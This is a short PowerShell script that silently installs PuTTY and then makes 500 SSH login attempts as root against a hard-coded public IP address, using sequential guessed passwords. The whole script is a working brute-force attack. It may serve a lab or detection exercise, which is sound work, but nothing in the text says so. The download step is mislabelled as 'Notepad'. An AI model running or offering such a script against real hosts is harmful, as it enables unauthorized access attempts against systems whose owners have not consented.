function SSHBruteForce($ip, $count)
{
    $username = "root";
    $password = "random";

    for($i=0;$i-lt$count;$i++)
    {
        SSHLogin $ip $username "$password-$i";
    }
}

function SSHLogin ($ip,$username, $password)
{
    $path = "c:\program files\putty\plink.exe"

    start-process $path -ArgumentList "$username@$ip -pw $password"

    stop-process -Name "plink" -ea SilentlyContinue
}

function InstallPutty()
{
    #check for executables...
	$item = get-item "C:\Program Files\Putty\putty.exe" -ea silentlycontinue;
	
	if (!$item)
	{
		$downloadNotePad = "https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.74-installer.msi";

        mkdir c:\temp -ea silentlycontinue 
		
		#download it...		
		Start-BitsTransfer -Source $DownloadNotePad -DisplayName Notepad -Destination "c:\temp\putty.msi"
        
        msiexec.exe /I c:\temp\Putty.msi /quiet
	}
}

#Note if this doesn't download putty, open a web browser to https://the.earth.li/~sgtatham/putty/0.74/w64/ and manually install it.
InstallPutty

$ip = "40.75.22.48";
$count = 500;

SSHBruteForce $ip $count;